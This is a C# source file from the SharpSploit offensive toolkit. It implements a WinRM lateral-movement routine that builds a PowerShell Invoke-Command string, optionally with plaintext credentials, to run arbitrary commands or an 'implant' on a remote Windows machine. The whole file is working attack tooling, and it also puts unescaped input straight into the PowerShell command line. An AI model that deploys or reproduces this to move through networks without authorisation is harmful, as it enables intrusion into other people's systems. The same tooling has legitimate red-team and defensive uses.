using System;

using SharpSploit.Execution;

namespace SharpSploit.LateralMovement
{
    /// <summary>
    /// WinRM is a class for executing lateral movement via Windows Remote Management (WinRM).
    /// </summary>
    public class WinRM
    {
        /// <summary>
        /// Execute a process on a remote system using WinRM.
        /// </summary>
        /// <param name="ComputerName">ComputerName of remote system to execute process.</param>
        /// <param name="Command">Command to execute on remote system.</param>
        /// <param name="Domain">Domain for explicit credentials.</param>
        /// <param name="Username">Username for explicit credentials.</param>
        /// <param name="Password">Password for explicit credentials.</param>
        /// <returns>Bool. True if execution succeeds, false otherwise.</returns>
        /// <author>Daniel Duggan (@_RastaMouse)</author>
        /// <remarks>
        /// The return value is a little ambigious as the function won't return as long
        /// as the implant remains running on the remote target. Also, if execution fails
        /// (e.g. because bad creds), it doesn't throw an error and it returns true regardless.
        /// </remarks>
        public static bool WinRMExecute(string ComputerName, string Command, string Domain = "", string Username = "", string Password = "")
        {
            try
            {
                var cmd = string.Empty;

                if (Domain != "" && Username != "" && Password != "")
                    cmd += $"$Credential = New-Object System.Management.Automation.PSCredential(\"{Domain}\\{Username}\", (ConvertTo-SecureString \"{Password}\" -AsPlainText -Force)); ";

                cmd += $"Invoke-Command -ComputerName {ComputerName} -ScriptBlock {{ {Command} }}";

                if (Domain != "" && Username != "" && Password != "")
                    cmd += $" -Credential $Credential";

                Shell.PowerShellExecute(cmd, false);
                return true;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("WinRM Failed: {0}", e.Message);
                return false;
            }
        }
    }
}